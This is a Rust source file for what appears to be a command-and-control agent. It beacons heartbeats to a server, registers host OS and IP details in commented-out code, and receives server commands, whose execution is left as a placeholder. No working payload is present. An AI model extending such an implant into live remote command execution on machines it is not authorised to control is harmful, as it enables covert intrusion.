use std::error::Error;

use reqwest::Client;
use serde_json::json;
use talaria::{AgentInstruction, AgentResponse, AgentResponseBody, PacketHeader};

use crate::agent::Agent;

// async fn register_agent(
//     client: &Client,
//     backend_url: &str,
//     info: &SystemInfo,
// ) -> Result<(), reqwest::Error> {
//     client
//         .post(format!("{}/agent/{}/register", backend_url, info.id))
//         .json(&json!({
//             "id": info.id,
//             "os": info.os,
//             "ip": info.ip,
//             "active": true
//         }))
//         .send()
//         .await?;
//     Ok(())
// }

async fn make_request(agent: &mut Agent, request: AgentResponse) -> Option<AgentInstruction> {
    agent.send_log.push(request.clone());

    let request = AgentResponse::serialize(&request);
    let response = agent
        .http_client
        .post(agent.server_addr.clone() + "/agent/monolith")
        .body(request)
        .send()
        .await;

    match response {
        Ok(response) => {
            let bytes = response.bytes().await.unwrap();
            let instruction = AgentInstruction::deserialize(&bytes.to_vec());
            agent.rec_log.push(Ok(instruction.clone()));
            Some(instruction)
        }
        Err(error) => {
            agent.rec_log.push(Err(error));
            None
        }
    }
}

pub async fn handle_response(agent: &mut Agent, response: AgentInstruction) {
    match response.instruction {
        talaria::AgentInstructionBody::Command {
            ref command,
            ref command_id,
            ref args,
        } => {
            println!(
                "Executing Command: {:?}, ID: {:?}, Args: {:?}",
                command, command_id, args
            );
            // Placeholder for actual command execution logic
        }
        talaria::AgentInstructionBody::RequestHeartbeat => {
            println!("Received heartbeat request from server.");
        }
        talaria::AgentInstructionBody::Ok => {
            println!("Server acknowledged previous operation.");
        }
    }

    println!("Processed Response: {:#?}", response);
}

pub async fn send_heartbeat(agent: &mut Agent) -> Option<AgentInstruction> {
    let response = talaria::AgentResponse {
        packet_header: agent.generate_packet_header(),
        response: AgentResponseBody::Heartbeat,
    };

    return make_request(agent, response).await;
}
//
// pub async fn connect_and_listen() -> Result<(), Box<dyn std::error::Error>> {
//     let server_url = "wss://your-public-server.com/socket";
//     let backend_url = "https://your-backend-server.com"; // Replace with actual backend URL
//     let client = Client::new();
//
//     // Register the agent with the backend server
//     let system_info = agent::get_system_info().await?;
//     register_agent(&client, backend_url, &system_info).await?;
//
//     let (mut socket, _response) = connect(Url::parse(server_url)?).expect("Failed to connect");
//
//     // Main loop to listen for commands from the server
//     loop {
//         // Send a heartbeat to the server periodically (e.g., every 60 seconds)
//         send_heartbeat(&client, backend_url, system_info.id).await?;
//
//         if let Ok(msg) = socket.read_message() {
//             if let Message::Text(command) = msg {
//                 // Handle the command
//                 if let Some(response) = commands::handle_command(&command) {
//                     // Send the command output back to the server
//                     socket.write_message(Message::Text(response)).unwrap();
//                 }
//             }
//         }
//     }
// }
